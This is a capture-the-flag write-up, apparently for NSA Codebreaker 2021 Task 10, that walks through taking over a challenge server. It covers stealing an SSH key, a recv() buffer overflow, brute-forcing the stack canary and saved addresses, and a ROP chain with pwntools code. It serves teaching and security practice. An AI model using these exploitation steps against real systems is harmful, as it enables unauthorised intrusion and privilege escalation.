# Task 10
## Getting Persistence
Alright, this is gonna be a long one. Buckle up, y'all! 

After solving Task 9, your goal should be to get persistence on the LP as `lpuser`. If you've properly written your script to interact with the LP, this shouldn't be too difficult. Jumping around the home directory of `lpuser` (`/home/lpuser/`) reveals that there's a `.ssh` directory, along with a public/private keypair we can read! If we read `/home/lpuser/.ssh/id_rsa`, we should now have the private key to connect to the LP's SSH server as `lpuser`. This is the "**Gain access to the LP**" part of the task.
## Enumerating
The second goal for this task is to "**Provide the IP and port that the `psuser` account has trasmitted data to**". Since we're currently `lpuser`, we need to see what potential vectors we have to escalate our privileges to `psuser`. Digging around `/home/psuser` is a good place to start. We see some files, including a couple of logs (`ps_server.log` and `ps_data.log`), as well as a file named `powershell_lp`. Running `ps aux | grep psuser`, which lists running processes and filters them to those that `psuser` is running should also give us an idea of what `psuser` is up to on this box that we could exploit. We are able to see that it's running the `powershell_lp` file through another script (`runPs.sh`). At this point, we've sufficiently established that this is what we're looking for. To be safe, I copied off a couple other files in the home directory but only the `powershell_lp` file is really needed.
## Initial Analysis
We need to now analyze the `powershell_lp` file. Running `file powershell_lp` will give us ![](https://i.imgur.com/R9vpHIM.png)

Ah, a stripped binary with PIE. Fun.

Stripped binaries aren't very fun to look at, but disassemblers will often use function hashes to "put back" some common functions. Think of a stripped binary like getting a box of random fruits. You've probably seen some of the fruits before because they're common, even if there are some fruits that you don't recognize. In this way, disassemblers can tell where common functions like `read()` and `write()` are by storing their hashes and comparing the stored hashes to hashes of functions in the binary. Even though this is an NSA challenge and Ghidra was very helpful on prior tasks, I found more luck analyzing the binary with Binary Ninja.

The binary contains a **lot** of functions, but with function hashing, we can identify the subset that are user-written and not just part of a standard library. Let's start with some dynamic analysis first, though. If we run the binary with `./powershell_lp`, we see that two new files, `ps_server.log` and `ps_data.log`, are created. We also get an output message: "**Server started port 8080**". 

Let's connect to the server and see what's up. If we run `nc localhost 8080`, we're able to connect but don't seem to get anything back even if we send input. It looks like `ps_server.log` recorded the incoming connection's PID (process ID), IP/port, and exit code. It also says "**Child X handling...**", so this binary probably forks to a child process to handle an incoming connections. That piece of info is important for later, but for now, let's keep exploring.

Aha! Remember Task 3 where the **Powershell** malware communicated with an **HTTP** server on **port 8080** to send private keys? Let's try an HTTP request to `http://localhost:8080`, specifically a `POST` request like in the [malware](https://github.com/dhruvashok/codebreaker21/blob/main/task4/malicious.ps1#L311).
![](https://i.imgur.com/znhsfFY.png)
Ok, cool! We see that the dummy data we sent also got logged in the `ps_data.log` file now! Let's turn to some static analysis now.

## Finding the Vulnerability
This section would be *very* long if I went over all the different things in this binary. When I analyzed the binary, I assumed the vulnerability would be in how the HTTP request data was handled. I happened to be correct here. To make it simpler, I'm just going to show the disassembly of the input handling sections and explain them here.

![](https://i.imgur.com/xANdm7r.png)
Let's start with these two functions. We see that `sub_8d9d` seems to be receiving some data and reading it into `var_1018`. When `0xa` (newline) is hit, the program will make the next byte after it a null, and call a function named `j_strstr()`. We'll have to dig into the assembly to see what's going on here, but `j_strstr()` is a string comparison function.

![](https://i.imgur.com/hmjjQSy.png)

This doesn't look super useful or suspicious unless I add some context, so let's do that.

![](https://i.imgur.com/GA20GGN.png)

Ok, that's better. So what is the program doing here? The `recv()` function a minimum of three arguments: the file descriptor to read from, the buffer to read the bytes into, and the maximum number of bytes to read. `recv()` is also placed in a while loop here, so while the number of bytes the program has received is less than the maximum number of bytes, we will try to read more bytes from the socket into the buffer. The max bytes number is specified when we send our HTTP request, through the `Content-Length` header, and is our third function argument here. We are allowed to send any amount up to 4096 bytes. Look closer at the `recv()` call. Notice anything? **The program reads in the max number of bytes that we specify each time, even after we've sent some of our data but not all**. This means that if we specify a length of 4096, send 4095, and wait for a very short period, the program will remain in the while loop and `recv()` will ask for **up to 4096 bytes again**. Since the buffer is allocated to only take 4096 bytes, if we send another 4096 bytes after our original 4095, **we will overflow the buffer**. Ok, initial point of attack established!
## Exploitation
Ok, let's implement the idea now. Specify 4096, send 4095, wait for a bit, send more data.

```python
from pwn import *
import time
r = remote("127.0.0.1", 8080)
r.send(b"POST / HTTP/1.1\r\n")
r.send(b"Host: 127.0.0.1:8080\r\n")
r.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
r.send(f"Content-Length: 4096\r\n\r\n".encode())
r.send(b"A"*4095)
time.sleep(0.2) # wait for a bit here
r.send(b"A"*100)
```

![](https://i.imgur.com/MzNWKSm.png)

And there it is.

There are four (arguably 5) protections on this binary: stack canary, NX, PIE, Full RELRO, and (arguably, since it's very common and determined by the environment rather than the binary) ASLR. Three of these protections + ASLR ended up being relevant. Let's knock them out one by one and get ourselves a shell as `psuser`.
### Stack Canary
For those who don't know, a stack canary is a randomized sequence of bytes (8 in this case) placed on the stack to prevent buffer overflows. The idea is that if a buffer overflow occurs, the bytes will be modified and the program can check the bytes on the stack with the original bytes  in the kernel, see that they don't match, and abort the program.

To bypass a canary, we need to "put back" the bytes: in other words, we need to overwrite the area of the stack containing the canary with the *same* bytes as the canary, so as to not trigger a crash. Remember how I said this program forks to a child process to handle incoming connections? That's important. **Child processes retain the same canary set in the parent**. This means that on every connection we make to a running instance of `powershell_lp`, the canary *does not change*!

We can also control the length and entirety of our data (nothing is prepended or appended). This means we can send *just* enough bytes to overwrite a byte of the canary over and over, and when the program doesn't crash, we'll know that the byte we sent matched the canary byte! A *byte-by-byte* bruteforce, or partial overwrite attack. Instead of having to guess one of `256^8` possibilities, we will have to try a *maximum* of `256*8` possibilities. Much more reasonable! [More on this here](https://ctf101.org/binary-exploitation/stack-canaries/)

Remember `ps_server.log`? It stored the exit code of the child process. We can use that information to determine if we've either crashed the binary or overwritten the canary byte with the same byte and exited properly. If we take a look at the file..
![](https://i.imgur.com/XJXhcOw.png)

"exited with status 0" means we exited with no problems, "exited due to signal 6" means we smashed the stack canary. Cool. Brute force time!

```python
canary = bytes([])
while len(canary) < 8:
	for i in range(256):
		new = exploit(canary, bytes([i])
		if new:
			canary += new
			print(f"CANARY: {canary.hex()}")
			if len(canary) == 8:
				break
			break
print(f"GOT CANARY: {canary.hex()}")
```
	
Note: `exploit()` implemented [here](https://github.com/dhruvashok/codebreaker21/blob/main/task10/xpl.py#L14-L34), it specifies 4096 bytes, sends 4095 bytes, waits, and then sends 9 bytes of junk (the canary is placed 8 bytes after the end of the buffer of length 4096, 4096+8 == 4095+9) along with the canary and the next byte to try. It then waits a bit and checks the last two lines of `ps_server.log` to see if "status 0" exists: if it does, return the byte, else return `None`.
### PIE
PIE stands for Position Independent Executable. If you're familiar with ASLR, you'll know that addresses for the stack, heap, and libraries (such as libc) are randomized at runtime. If PIE is on in a binary, the addresses of the code section are also randomized at runtime. This can be a measure against ROP (return oriented programming) attacks, where bits of the code section itself (which is stored at a static address in non-PIE binaries) are used to control program execution. Like with libc, the addresses of the code section are still placed at the same relative offsets from each other, but the *base* address of the section is randomized. This means that if we were to figure out an address from somewhere within the code, and we knew the offset from the base of that address, we would be able to calculate the base address of the code section! After that, simply adding the offset of some code we want to jump to to the base address will yield the correct address, and we can use ROP again to control execution.

So how can we leak an address from within the code section? [This article](https://ret2rop.blogspot.com/2020/05/canary-pie-byte-bruteforce.html) explains the concept well. Simply use the same technique we used on the canary for the stored RIP. If you're unfamiliar, the RIP stands for Return Instruction Pointer, meaning it will point to the address of the current instruction the program is executing. Since the program will execute instructions stored in the code section, we can work out the address of the RIP by brute forcing it, and then subtracting its offset to yield the base address. The same technique works here because address are randomized when the *parent* starts, and every child inherits the same memory map set in the parent. This means that though the addresses are randomized once, once we figure out the base address, *we don't have to do it on every connection unless we kill and restart the binary*!

Another caveat here: there are a couple other values on the stack for a couple other registers, but overwriting them doesn't really affect program execution. **However**, the value of the RBP (return base pointer) *does* matter, and it needs to be a valid address that doesn't crash the program. We can use the same technique that we did for the canary here as well. However, unlike in the article I linked, there's not really a reliable way to get the actual RBP address, but simply getting a value that doesn't crash the program **is sufficient** for what we wanna do here. If that went over your head, here's a map of the stack to help:

| buffer (4096) | junk (8) | canary (8) | irrelevant registers (16) | RBP (8) | RIP (8) |
|---------------|----------|------------|---------------------------|---------|---------|
| AAAAAA...J    | UNKDATA! | 00..       | AAAAAAAAAAAAAAAA          | ??      | ??      |

My RBP brute force was a little jank because I ended up having it sorta brute force 1 to 3 bytes at a time and then re-running it a couple times to get the whole thing to avoid a little something called *race conditions*.. yours doesn't have to be that way though (just add a bit longer delay or give the server a rest and then try again if your program messes up too). Just implement it the same way as the canary brute force and you should be good.

Alright, now do that same thing for the RIP. If done correctly, you should now have leaked the RIP address and it should be something like `0x7f?????????91a`. How do I know that? A little something called page alignment. All sections in the binary are aligned to a page size of `0x1000`. This means the last one and a half bytes (12 bits, or three "nibbles") of a base address are always `000`. What happens when you add something to 0? You get the thing! Since the offsets of user written code are generally in the 16 bit range (`0x????`), we can work out that the RIP is one of `0x?91a`, where `?` is a nibble between `0` and `0xf`. If you look up the instructions at all those offsets in any disassembler, you should find that `0x991a` makes the most sense: it's right after the call to `__fork()`! Subtract `0x991a` from your leaked RIP, and you have the PIE base address.
### ASLR
Ok, I know I said this isn't *really* a protection because it's common and determined by the environment, but it's still relevant to what we're trying to do here (sorta). So at this point, most people's exploits started diverging. You have the canary and full control over the RIP, meaning you can control program execution and make it do whatever you want if you set it up right. For a lot of people, their first thought was ROP. Simply use segments of the code to set up a call and give yourself a shell. However, since the program forked to a new child file descriptor, calling `execve` with ROP would result in the shell being spawned in the parent process. I realized I would have to set up calls to other functions to duplicate the shell to the child file descriptor so that I actually could interact with the shell. Instead, I opted to use shellcode, which took arguably took a bit more effort.

To use shellcode, we need to be able to jump to an area of memory which contains it and that area needs to have executable privileges for the program to execute it (like the code section or libc does). We can write shellcode onto the stack, but we run into two problems: the stack base address is randomized by ASLR and determined separately from the PIE base address, and NX is on. Let's deal with the first here.

If we run `ldd powershell_lp`, we can determine whether the binary has been statically or dynamically linked. In this case, it's been *statically* linked. This is great for us, as a lot of code and symbols for different libraries is already contained within the binary. The binary has been stripped of symbols, but that just means the different symbols aren't named and we'll just have to a bit more digging. When searching through the binary in Binary Ninja, I came across an interesting function that it had managed to put a name to: `_dl_make_stack_executable`. That sounds pretty much *exactly* like what we wanna do!

After some trial and error of trying to get it to work, I actually looked at what it was doing, and realized that the function simply wrapped `mprotect`, an existing function that allows you to change protections on a section of memory. The key thing I pulled from `_dl_make_stack_executable` was the argument it was using to know *where* the stack was. That argument was loaded from a symbol in the data section which would normally be called `__libc_stack_end`. After finding [this writeup](https://github.com/onealmond/hacking-lab/blob/master/picoctf-2020/guessing-game1/writeup.md) which displayed the disassembly with symbols in, I simply compared it to that of Binary Ninja:

```assembly
; with symbols
mov rsi, qword [obj._dl_pagesize]
push rbx
mov rbx, rdi
mov rdx, qword [rdi]
mov rdi, rsi
neg rdi
and rdi, rdx
cmp rdx, qword [obj.__libc_stack_end]
```

```assembly
; without symbols (powershell_lp)
mov rsi, qword [rel data_2e81f8]
push rbx
mov rbx, rdi
mov rdx, qword [rdi]
mov rdi, rsi
neg rdi
and rdi, rdx
cmp rdx, qword [rel data_2e67b0]
```

And got the offset of `0x2e67b0` from the PIE base for `__libc_stack_end`. Cool! We now basically have a pointer to the end of the stack, which we can use to make the stack executable and execute our shellcode.
### NX
If you don't know, NX means no-execute. This means the stack is not executable by default; however, with full control over the RIP, we are free to call `mprotect` with the pointer to the end of the stack we found and make it executable again. However, we're first going to need to leak the address stored at our pointer to be able to use it in a call to `mprotect`. How can we do this? Well, ROP is a great option here. Specifically, we can use ROP to set the arguments for a call to the `write()` function, which can send the address over to us through our socket!

A great tool to get ROP gadgets for this purpose is [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). You'll also need to be familiar with the basic calling convention for x86-64, which [this table](https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md#x86_64-64_bit) is useful for. We just need to set the RDI (1st argument), RSI (2nd argument), and RDX (3rd argument) here, but it's good to know in general.

To manipulate these registers and form our ret chain, we need the address of the write function, as well as three gadgets: `pop rdi; ret`, `pop rsi; ret`, and `pop rdx; ret`. To form the chain we need to put the value we want in each of these registers after the gadget, and then place the next gadget we want to return to after that. Running ROPGadget will allow use to find these instructions:

`write()` &#8594; `0x568c0`

`pop rdi; ret` &#8594; `0x8876`

`pop rsi; ret` &#8594; `0x1a533`

`pop rdx; ret` &#8594; `0x1cca2`

`write()` takes three arguments: the file descriptor to write to, the address of the buffer to read from, and the number of bytes to write. We can use `strace` to figure out our file descriptor (or also guess, since it says the same each time). On my local system, it was 7; on the LP, it was 6. The buffer we want to read from is `__libc_stack_end` so we'll use our offset of `0x2e67b0` from earlier here. Finally, we want to read 8 bytes. Now to put it all together!

```python
data += p64(pie_base+0x8876) # pop rdi; ret
data += p64(6) # stdout = 1, child socket fd = 6
data += p64(pie_base+0x1a533) # pop rsi; ret
data += p64(pie_base+0x2e67b0) # __libc_stack_end
data += p64(pie_base+0x1cca2) # pop rdx; ret
data += p64(8) # size of buffer (8 bytes)
data += p64(pie_base+0x568c0) # call write
```

Something to note: I put a `r.recvall().hex()` in my code at this point. Before, we used `r.close()` to close the connection because we wanted to move on to the next one quickly in our brute forces and didn't care what the HTTP response was. Now, we do care, since we're leaking an address through the HTTP response. I found it helpful to also print `pie_base+0x568c0`. This way, I could search to see if there were 8 bytes after the address of `write()` (the write addr is the last thing we sent). If there was 8 bytes after, then we successfully leaked `__libc_stack_end`! If there wasn't, we needed to fix something in the code.

With our address, we can now set up our call to mprotect to bypass NX! Using our [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md#x86_64-64_bit) from earlier, we can see that `mprotect` takes 3 arguments: the starting address of the buffer to change permissions on, the length of the buffer, and the protocol, or permissions to set. Once again, we'll need to use our ROP gadgets to fill the `rdi`, `rsi`, and `rdx` with the necessary values. Our first argument will be need to be the start of the stack address. Note that this is the *start* of the stack, and the address we leaked was at the end of the stack. This initially posed a problem for me, but I realized that the size of the stack stayed consistent every run, so the offset from the address we leaked to the start of the stack was also consistent. I just used GDB to find the offset.